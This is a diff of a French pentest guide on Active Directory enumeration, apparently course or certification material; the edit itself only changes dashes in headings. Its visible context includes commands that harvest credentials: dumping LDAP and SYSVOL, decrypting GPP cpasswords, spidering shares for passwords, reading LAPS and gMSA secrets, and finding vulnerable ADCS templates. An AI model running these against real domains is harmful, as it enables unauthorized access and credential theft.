@@ -1,4 +1,4 @@
-# Phase 3 — Énumération
+# Phase 3 : Énumération
 
 ## Pourquoi c'est crucial
 
@@ -17,7 +17,7 @@ Avec un compte lambda, tu peux **interroger l'AD** pour obtenir une quantité ma
 
 ---
 
-## 3.1 — BloodHound (priorité absolue)
+## 3.1 : BloodHound (priorité absolue)
 
 C'est **l'outil le plus important** pour l'énumération AD. Il cartographie toutes les relations de l'AD et les affiche sous forme de **graphe**.
 
@@ -111,7 +111,7 @@ Ce chemin te dit exactement quoi faire pour devenir Domain Admin.
 
 ---
 
-## 3.2 — NetExec (nxc) — Couteau suisse
+## 3.2 : NetExec (nxc) : Couteau suisse
 
 ```bash
 # Vérifier ses accès sur tout le réseau (chercher (Pwn3d!))
@@ -138,7 +138,7 @@ nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --pass-pol
 
 ---
 
-## 3.3 — Énumération LDAP
+## 3.3 : Énumération LDAP
 
 L'AD est une base de données LDAP. On peut l'interroger directement.
 
@@ -153,7 +153,7 @@ ldapsearch -x -H ldap://$DC_IP \
 nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN --users
 ```
 
-### ldapdomaindump — Dump LDAP complet
+### ldapdomaindump : Dump LDAP complet
 
 ```bash
 ldapdomaindump \
@@ -171,7 +171,7 @@ grep -i "pass\|pwd\|cred\|secret\|flag" ~/certif/loot/ldap/domain_users.json
 
 ---
 
-## 3.4 — Exploration des partages SMB
+## 3.4 : Exploration des partages SMB
 
 ### Lister et explorer les partages
 
@@ -188,7 +188,7 @@ smbclient //$DC_IP/SYSVOL -U $DOMAIN/$USER%$PWD
 # smb: \> mget *      → tout télécharger
 ```
 
-### SYSVOL — Mine à flags et credentials
+### SYSVOL : Mine à flags et credentials
 
 ```bash
 # Télécharger SYSVOL en entier
@@ -207,7 +207,7 @@ gpp-decrypt 'VALEUR_CPASSWORD'
 
 | Fichier | Contenu possible |
 |---------|-----------------|
-| `Groups.xml` | cpassword GPP — mot de passe admin local |
+| `Groups.xml` | cpassword GPP : mot de passe admin local |
 | `*.ps1` | Scripts PowerShell avec credentials hardcodés |
 | `*.bat` | Scripts batch |
 | `*.ini` | Fichiers de configuration |
@@ -219,7 +219,7 @@ gpp-decrypt 'VALEUR_CPASSWORD'
 # Spider complet (cherche tous les fichiers)
 nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN -M spider_plus
 
-# manspider — chercher des mots-clés dans les fichiers
+# manspider : chercher des mots-clés dans les fichiers
 manspider $RANGE -c passw password cred flag \
     -e txt xml ini config ps1 bat \
     -d $DOMAIN -u $USER -p $PWD
@@ -227,20 +227,20 @@ manspider $RANGE -c passw password cred flag \
 
 ---
 
-## 3.5 — Énumération complémentaire
+## 3.5 : Énumération complémentaire
 
 ```bash
-# ADCS — Chercher les templates vulnérables
+# ADCS : Chercher les templates vulnérables
 certipy find -u $USER@$DOMAIN_FQDN -p $PWD \
     -dc-ip $DC_IP -vulnerable -stdout | tee ~/certif/loot/adcs.txt
 
-# LAPS — Lire les mots de passe admin locaux (si droits)
+# LAPS : Lire les mots de passe admin locaux (si droits)
 nxc ldap $DC_IP -d $DOMAIN -u $USER -p $PWD --module laps
 
-# gMSA — Mots de passe de comptes de service gérés
+# gMSA : Mots de passe de comptes de service gérés
 nxc ldap $DC_IP -u $USER -p $PWD --gmsa
 
-# enum4linux-ng — Énumération complète
+# enum4linux-ng : Énumération complète
 enum4linux-ng -a -u $USER -p $PWD $DC_IP | tee ~/certif/loot/enum4linux.txt
 ```
 
@@ -256,4 +256,4 @@ enum4linux-ng -a -u $USER -p $PWD $DC_IP | tee ~/certif/loot/enum4linux.txt
 - [ ] Fichiers `Groups.xml` trouvés → `gpp-decrypt` utilisé
 - [ ] Spider lancé sur les partages inhabituels
 - [ ] Chemins d'escalade BloodHound lus → technique choisie
-- [ ] Suite → [Phase 4 — Escalade](04-escalade.md)
+- [ ] Suite → [Phase 4 : Escalade](04-escalade.md)
